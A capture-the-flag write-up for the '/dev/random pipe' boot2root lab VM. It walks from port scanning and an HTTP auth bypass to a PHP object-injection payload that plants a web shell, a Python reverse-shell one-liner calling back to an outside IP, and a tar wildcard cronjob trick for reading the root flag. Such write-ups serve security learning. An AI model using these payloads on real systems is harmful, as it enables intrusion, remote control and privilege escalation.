### /dev/random pipe boot2root
  
  /dev/random pipe is a boot2root from vulhub.com
  
  ##STEP 1: machine finger-printing:
      - nmap -sT -V -A -p 1-65535 [vm-ip]
      
      It was found that ports 22,80, 111, and 40496. The only interesting one right now being 80.
  
  #STEP 2 : visiting the web page:
      Upon visiting the index, I saw I was requested to login with Http Basic Auth. I inspected the requests 
      and responses with BurpSuite, but didn't see anything out of the ordinary. So I attempted to start
      a brute force. With no luck, I turned to the walkthrough to find that if I created a request with a
      fake HTTP method, like GETS to /index.php, it bypassed the authentication.
  
  #STEP 3: directory enumeration:
      Using dirbuster, I was able to find a few interesting directories: /images and /scriptz. I was
      slightly confused at first until I saw the request made being made when clicking on "Show Artist Info", 
      and saw the param being passed. It was a serialized PHP object, and noticing the Log class in the file
      under log.php.BAK, I instantly thought PHP Object Injection:
  
  #STEP 4: PHP Object Injection (PHP Shell):
       - O:3:"Log":2:{s:8:"filename";s:27:"/var/www/html/images/hs.php";s:4:"data";s:38:"<?php print shell_exec($_GET['c']); ?>";}
      Once urlencoded and passed as "param" I saw my file hs.php appeard in /images
  
  #STEP 5: Reverse Shell:
      All that was left was to run a python reverse shell: 
      - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",6000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

  #STEP 6: Moving around as user www-data:
      So I did the usual scanning for local privalage escalation. However, nothing popped out. There was one strange thing.
      I kept on seeing backup files appear in /home/rene every couple of minute, and I thought ... cronjob. I eventually glossed
      over a walkthrough and saw the term "tar wildcard exploit" which led me in the right direction to find the following exploit:
  
  #STEP 7: Getting /root/flag.txt:    
      - cd /home/rene/backup
      - touch -- "--checkpoint=1"
      - touch -- "--checkpoint-action=exec=sh shell.sh"
      - echo "cat /root/flag.txt > /home/rene/flag && chmod 777 /home/rene/flag" > shell.sh
      and then wait for /home/rene/flag to appear.
      
    Overall it was quite an interesting ctf, especially the last part for reading the flag. Thanks!
